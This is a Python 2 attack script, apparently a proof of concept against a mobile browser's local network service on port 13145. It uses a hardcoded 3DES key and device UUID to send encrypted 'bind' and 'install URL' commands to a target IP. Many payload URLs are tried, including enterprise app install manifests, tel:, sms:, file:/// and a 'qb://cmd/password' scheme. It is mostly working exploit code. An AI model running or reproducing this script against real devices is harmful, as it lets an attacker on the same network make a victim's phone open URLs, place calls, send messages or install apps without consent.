#!/usr/bin/env python2
# -*- coding: utf-8 -*-  

import requests
import base64
from binascii import b2a_hex, a2b_hex
from pyDes import *

payload = ""

x_uuid = "a8f349666b833151a861e8beb611f21a"
key = "kM7hYp8lE69UjidhlPbD98Pm"
url="http://www.qq.com"

#url2="https://itunes.apple.com/cn/app/homescapes/id1195621598?l=en&mt=8"
#url2="https://itunes.apple.com/cn/app/microsoft-remote-desktop/id1295203466?mt=12"
url2="https://itunes.apple.com/cn/app/microsoft-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/id714464092?mt=8"
url3="http://mtt.eve.mdt.qq.com:8080/analytics/upload?sid=bbef62326f3b74b21f4ba91efcbddd7c"
#url4="itms-services://?action=download-manifest&url=https%3A%2F%2Fithunder-ota.a.88cdn.com%2FMobileThunder%2Fapple%2F5.31.1.4204%2F96d&tn=98010089_dg&ch=2"
url4="itms-services://?action=download-manifest&url=https://ithunder-ota.a.88cdn.com/MobileThunder/apple/5.31.1.4204/96d&tn=98010089_dg&ch=2"
#url4="sms:10086:asd:15092831234;kkkk"
#url4="wtai://wp/mc;10086"
url4="mailto:10086"
#ip=[""]*1
#ip[1]="http://192.168.30.164"
#ip[0]="http://192.168.30.53"
#ip[0]="http://192.168.30.177"
#ip[0]="http://127.0.0.1"

#url4="/Users/ret2me/Documents/task/portApp/ps1.txt"
url4="tel:10086"
url4="sms:10086"
url4="itms-services://?action=download-manifest&url=https%3A%2F%2Fithunder-ota.a.88cdn.com%2FMobileThunder%2Fapple%2F5.21%2F5.21.1.1820_enterprise_release%2Fmainfest.plist"
url4="http://www.qq.com"

#url4="https://open.weixin.qq.com/connect/sdk/qrconnect?appid=id&nonces"
url4="http://www.qq.com"
url4="qb://video/advideodetail"
url4="file:///"
url4="tel:10086"
url4="itms-services://?action=download-manifest&url=https%3A%2F%2Fithunder-ota.a.88cdn.com%2FMobileThunder%2Fapple%2F5.21%2F5.21.1.1820_enterprise_release%2Fmainfest.plist"

url4="qb://imagereader?url=/var/mobile/Containers/Data/Application/314DC39D-A342-4742-B6EC-B0CDB15CC24F/Documents/IMG_0001.PNG"
url4="qb://cmd/password"
url4="file://res/CategorySearch/icon_baidu.png"
url4="hls://"

url4="tel:10086"
#url4="sms:10086"
#url4="itms-services://?action=download-manifest&url=https%3A%2F%2Fithunder-ota.a.88cdn.com%2FMobileThunder%2Fapple%2F5.21%2F5.21.1.1820_enterprise_release%2Fmainfest.plist"
#url4="http://www.baidu.cn"

def encode_(s):
    e_scheme = triple_des(key, ECB, "\0\0\0\0\0\0\0\0", pad = None, padmode = PAD_PKCS5)
    r = e_scheme.encrypt(s) 
    return base64.b64encode(r)

def decode_(s):
    b = base64.b64decode(s)
    e_scheme = triple_des(key, ECB, "\0\0\0\0\0\0\0\0", pad = None, padmode = PAD_PKCS5)
    return e_scheme.decrypt(b)

def req(ip, payload):
    headers = { 'Content-Length':str(len(payload)), 'Content-Type':'application/x-www-form-urlencoded',
    'Host':'127.0.0.1', 'Connection':'close', 'Accept-Encoding':'gzip'}
    #print headers
    try:
        #r = requests.post("http://192.168.70.194:13145/"+ "showbindcode?", data=payload, headers=headers)
        #for i in xrange(0,len(ip)):
        r = requests.post("http://"+ ip + ":13145/"+ encode_("bind?uuid=a8f349666b833151a861e8beb611f21a"), data=payload, headers=headers)
        r = requests.post("http://"+ ip + ":13145/"+ encode_("send?uuid=a8f349666b833151a861e8beb611f21a&type=installurl"), data=payload, headers=headers)
            #r = requests.get(ip[i]+":13145/"+encode_("check?uuid=d661d51862c23e397d14cb0eb2bf46f4"))

            #r = requests.post(ip[i]+":13145/"+ encode_("upload?uuid=a8f349666b833151a861e8beb611f21a"), data=payload, headers=headers)

        #r = requests.post("http://192.168.30.154:13145/"+ encode_("send?uuid=d661d51862c23e397d14cb0eb2bf46f4&type=url"), data=payload, headers=headers)
        #r = requests.post("http://192.168.30.154:13145/"+ encode_("send?uuid=d661d51862c23e397d14cb0eb2bf46f4&type=url"), data=payload, headers=headers)

     #   r = requests.post("http://192.168.30.154:13145/"+ encode_("showbindcode?uuid=d661d51862c23e397d14cb0eb2bf46f4&name=aaa&code=1234?fkkk"), data=payload, headers=headers)




        #r = requests.post("http://192.168.30.154:13145/"+ encode_("upload?uuid=d661d51862c23e397d14cb0eb2bf46f4"), data=payload, headers=headers)

        #r = requests.post("http://192.168.30.154:13145/bind?uuid=" + x_uuid, data=payload, headers=headers)
        
        #r = requests.get("http://192.168.1.100:13145/showbindcode?uuid=" + x_uuid)                        

       
        #r = requests.get("http://192.168.0.102:13145/"+encode_("check?uuid=d661d51862c23e397d14cb0eb2bf46f4"))     
            #print r.status_code
        #print r.content
        if r != '':
            print "[*] Response data: " + decode_(r.content)
        #print r.headers                   
    except:
        print "Error"



def main(argv):

    print "[*] Target: " + argv[0]
    print "[*] Type: " + argv[1]
    print "[*] Post data: " + argv[2]
    req(argv[0], encode_(argv[2]))
    print "[+] Done"    
    
if __name__ == "__main__":
    main(sys.argv[1:])
    
#     stage1 = encode_("{'code':'123456','uuid':" + x_uuid + "}")
#     stage3 = encode_("{'code':'123456','name':" + url + "}")
#     tmp = encode_("A"*0x100)
#     stage2 = encode_(stage1)
    #print decode_("HRMnNxAXVSQ9PSRNidZ41PgbLZcuLsMAAj7fOcnNZUDg0FfAUDgV9g==")
    
    #req(encode_(url4))
    #req(encode_(sys.argv[1]))
    #req(encode_("tel:10086"))
    #req(encode_("sms:10086"))
    #req(encode_("itms-services://?action=download-manifest&url=https%3A%2F%2Fithunder-ota.a.88cdn.com%2FMobileThunder%2Fapple%2F5.21%2F5.21.1.1820_enterprise_release%2Fmainfest.plist"))
    #req(encode_(""))

    #req("http://www.qq.com")